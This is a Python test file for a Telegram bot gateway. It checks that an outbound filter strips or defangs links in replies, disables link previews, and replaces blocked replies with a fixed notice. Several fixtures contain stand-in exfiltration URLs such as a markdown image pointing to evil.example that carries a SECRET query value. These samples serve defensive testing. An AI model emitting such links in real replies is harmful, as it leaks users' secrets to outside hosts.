# Copyright 2026 Devam Patel
# Licensed under the Apache License, Version 2.0. See LICENSE in the project root.

"""P4.3 wiring: the exfil filter runs on every `send_text`, link previews are
off on every Telegram send call, and a blocked reply is replaced by a fixed
notice (no raw content on the wire or in logs)."""

from __future__ import annotations

import ast
import logging
import pathlib
from html import unescape as html_unescape

import pytest

from src.gateway import exfil
from src.gateway.exfil import BLOCKED_NOTICE, LINK_REMOVED
from src.gateway.render import MAX_MESSAGE_CHARS
from src.gateway.telegram import APPROVAL_LINK_WARNING
from src.gateway.types import ApprovalCard, MessageRef, OutboundBlocked
from tests.unit.gateway.fake_telegram import FakeTelegram
from tests.unit.gateway.test_gateway_outbound import build

# Every Bot API method that puts text in front of the user.
SEND_METHODS = {
    "sendMessage",
    "editMessageText",
    "sendPhoto",
    "sendDocument",
    "sendVideo",
    "sendAudio",
    "sendVoice",
    "sendAnimation",
    "sendMediaGroup",
    "sendLocation",
    "sendVenue",
    "sendContact",
    "sendPoll",
    "sendDice",
    "sendSticker",
    "copyMessage",
    "copyMessages",
    "forwardMessage",
    "forwardMessages",
    "editMessageCaption",
    "editMessageMedia",
    "sendInvoice",
    "sendGame",
}


async def test_reply_link_is_neutralised_on_the_wire() -> None:
    fake = FakeTelegram()
    await build(fake).send_text("see ![x](https://evil.example/p.png?d=SECRET) and evil.com/x")
    (body,) = fake.sent
    assert "SECRET" not in body["text"] and "evil.example" not in body["text"]
    assert LINK_REMOVED in body["text"]


async def test_allowlisted_host_survives_on_the_wire() -> None:
    fake = FakeTelegram()
    gw = build(fake, reply_url_allowlist=("docs.python.org",))
    await gw.send_text("read https://docs.python.org/3/ today")
    assert fake.sent[0]["text"] == "read https://docs.python.org/3/ today"


async def test_blocked_reply_sends_fixed_notice_and_logs_no_content(
    monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
) -> None:
    monkeypatch.setattr(exfil, "_neutralise", lambda text, policy: (text, 0))
    fake = FakeTelegram()
    with caplog.at_level(logging.DEBUG):
        await build(fake).send_text("go https://evil.example/?d=SECRET", reply_to=MessageRef(3))
    (body,) = fake.sent
    assert body["text"] == BLOCKED_NOTICE
    assert body["reply_parameters"]["message_id"] == 3
    logs = "\n".join(r.getMessage() for r in caplog.records)
    assert "blocked" in logs and "SECRET" not in logs and "evil" not in logs


async def test_every_chunk_is_rechecked(monkeypatch: pytest.MonkeyPatch) -> None:
    """Defence in depth for splitting: if any chunk fails the post-check, no
    chunk is sent and the fixed notice goes instead."""
    fake = FakeTelegram()
    gw = build(fake)
    real = exfil.find_links
    calls: list[int] = []

    def flag_second_chunk(text: str, policy: exfil.ReplyUrlPolicy) -> list[str]:
        calls.append(1)
        return ["domain"] if text.startswith("tail") else real(text, policy)

    monkeypatch.setattr("src.gateway.telegram.find_links", flag_second_chunk)
    await gw.send_text("a" * (MAX_MESSAGE_CHARS - 2) + "\n\ntail end")
    assert [b["text"] for b in fake.sent] == [BLOCKED_NOTICE]
    assert len(calls) >= 2


async def test_keypad_text_is_filtered_and_fails_closed(monkeypatch: pytest.MonkeyPatch) -> None:
    fake = FakeTelegram()
    gw = build(fake)
    await gw.send_keypad("enter code for evil.com", [[("1", "k:1")]])
    assert fake.sent[0]["text"] == "enter code for evil[.]com"
    monkeypatch.setattr(exfil, "_neutralise", lambda text, policy: (text, 0))
    with pytest.raises(OutboundBlocked):
        await gw.send_keypad("https://evil.example/?d=1", [[("1", "k:1")]])
    assert len(fake.sent) == 1


async def test_every_send_path_disables_link_previews() -> None:
    fake = FakeTelegram()
    gw = build(fake)
    await gw.send_text("hello https://evil.example")
    await gw.send_text("p\n\n" + "x" * 5000)
    await gw.send_approval(ApprovalCard("create https://x.example", "ap:a", "rj:a"))
    await gw.send_keypad("code", [[("1", "k:1")]])
    await gw.close_approval(MessageRef(5), outcome="approved")
    sends = [(m, b) for m, b in fake.requests if m in SEND_METHODS]
    assert len(sends) >= 6
    for method, body in sends:
        assert method == "sendMessage"
        assert body["link_preview_options"] == {"is_disabled": True}
        assert "disable_web_page_preview" not in body or body["disable_web_page_preview"] is True


def test_only_one_send_call_site_in_src() -> None:
    """Static guard: the only Telegram send method named anywhere in `src` is
    `sendMessage`, once, inside `TelegramGateway._send_one` (which sets
    `link_preview_options.is_disabled`). A new send path must come through it."""
    sites: list[tuple[str, str]] = []
    for p in pathlib.Path("src").rglob("*.py"):
        tree = ast.parse(p.read_text(encoding="utf-8"))
        for fn in ast.walk(tree):
            if not isinstance(fn, ast.FunctionDef | ast.AsyncFunctionDef):
                continue
            for n in ast.walk(fn):
                if (
                    isinstance(n, ast.Constant)
                    and isinstance(n.value, str)
                    and n.value in SEND_METHODS
                ):
                    sites.append((p.as_posix(), fn.name))
    assert sites == [("src/gateway/telegram.py", "_send_one")]
    src = pathlib.Path("src/gateway/telegram.py").read_text(encoding="utf-8")
    one = ast.get_source_segment(
        src,
        next(
            n
            for n in ast.walk(ast.parse(src))
            if isinstance(n, ast.AsyncFunctionDef) and n.name == "_send_one"
        ),
    )
    assert one is not None and '"link_preview_options": {"is_disabled": True}' in one


def test_send_text_runs_the_filter() -> None:
    """Static tripwire: `send_text` sends only `_outbound_chunks` output, and
    that runs `filter_reply` plus the per-chunk `find_links` (the gateway has
    no other text-send entry point besides approval cards and keypads)."""
    tree = ast.parse(pathlib.Path("src/gateway/telegram.py").read_text(encoding="utf-8"))
    fns = {
        n.name: n for n in ast.walk(tree) if isinstance(n, ast.FunctionDef | ast.AsyncFunctionDef)
    }
    names = {
        n.func.id
        for n in ast.walk(fns["_outbound_chunks"])
        if isinstance(n, ast.Call) and isinstance(n.func, ast.Name)
    }
    assert {"filter_reply", "find_links"} <= names
    attrs = {
        n.func.attr
        for n in ast.walk(fns["send_text"])
        if isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute)
    }
    assert "_outbound_chunks" in attrs


@pytest.mark.parametrize("bad", [("*.evil.example",), ("https://x.org",), ("10.0.0.1",)])
def test_settings_reject_bad_allowlist(bad: tuple[str, ...]) -> None:
    with pytest.raises(ValueError):
        build(FakeTelegram(), reply_url_allowlist=bad)


# ---- M2: approval card layout and link warning ----

APPROVAL_HEADER = "Approval needed. Exact payload:\n"


def _card_parts(body: str) -> tuple[str, str]:
    """Split a card into (text outside <pre>, text inside). Exactly one <pre>."""
    assert body.count("<pre>") == 1 and body.count("</pre>") == 1
    assert body.endswith("</pre>")
    outside, inside = body[: -len("</pre>")].split("<pre>")
    return outside, inside


@pytest.mark.parametrize(
    "payload",
    [
        "create_event(title='Dinner')",
        "append(text='see https://evil.example/?d=SECRET')",
        "note(text='</pre><b>x</b> evil.com')",
        "line1\nline2 <pre>",
    ],
)
async def test_approval_card_is_header_plus_one_pre(payload: str) -> None:
    fake = FakeTelegram()
    await build(fake).send_approval(ApprovalCard(payload, "ap:a", "rj:a"))
    (body,) = fake.sent
    outside, inside = _card_parts(body["text"])
    assert outside in (APPROVAL_HEADER, APPROVAL_LINK_WARNING + "\n" + APPROVAL_HEADER)
    # Nothing from the payload outside the <pre>: the outside is fixed text.
    assert "evil" not in outside and "SECRET" not in outside
    assert html_unescape(inside) == payload
    assert body["link_preview_options"] == {"is_disabled": True}


async def test_approval_card_warns_on_link_without_echoing_host() -> None:
    fake = FakeTelegram()
    gw = build(fake)
    await gw.send_approval(ApprovalCard("go https://evil.example/x", "ap:a", "rj:a"))
    await gw.send_approval(ApprovalCard("plain text", "ap:b", "rj:b"))
    with_link, plain = (_card_parts(b["text"])[0] for b in fake.sent)
    assert with_link.startswith(APPROVAL_LINK_WARNING)
    assert plain == APPROVAL_HEADER
    assert exfil.find_links(APPROVAL_LINK_WARNING, exfil.ReplyUrlPolicy()) == []


async def test_approval_card_allowlisted_link_has_no_warning() -> None:
    fake = FakeTelegram()
    gw = build(fake, reply_url_allowlist=("docs.python.org",))
    await gw.send_approval(ApprovalCard("read https://docs.python.org/3/", "ap:a", "rj:a"))
    assert _card_parts(fake.sent[0]["text"])[0] == APPROVAL_HEADER


# ---- L3: callback toasts carry only code-written text ----


def test_answer_callback_text_is_constants_only() -> None:
    """`answerCallbackQuery` text is not filtered (toasts are not linkified),
    so every caller must pass a constant, a module UPPER_CASE name, or an
    f-string built only from those and numbers -- never model or payload text."""
    calls = 0
    for p in pathlib.Path("src").rglob("*.py"):
        tree = ast.parse(p.read_text(encoding="utf-8"))
        for n in ast.walk(tree):
            if not isinstance(n, ast.Call) or not isinstance(n.func, ast.Attribute):
                continue
            if n.func.attr not in {"answer_callback", "_answer"}:
                continue
            args = n.args[1:] + [k.value for k in n.keywords if k.arg == "text"]
            for a in args:
                calls += 1
                assert _code_text(a), f"{p}:{n.lineno} passes non-constant callback text"
    assert calls >= 10


def _code_text(node: ast.expr) -> bool:
    if isinstance(node, ast.Constant):
        return node.value is None or isinstance(node.value, str)
    if isinstance(node, ast.Name):
        return node.id.isupper() or node.id == "text"  # `text`: pass-through wrappers
    if isinstance(node, ast.JoinedStr):
        return all(_code_text_part(v) for v in node.values)
    return False


def _code_text_part(node: ast.expr) -> bool:
    if isinstance(node, ast.Constant):
        return True
    if isinstance(node, ast.FormattedValue):
        v = node.value
        if isinstance(v, ast.Name):
            return v.id.isupper()
        # len(...) -> a number, e.g. the keypad "3/6" progress
        return isinstance(v, ast.Call) and isinstance(v.func, ast.Name) and v.func.id == "len"
    return False
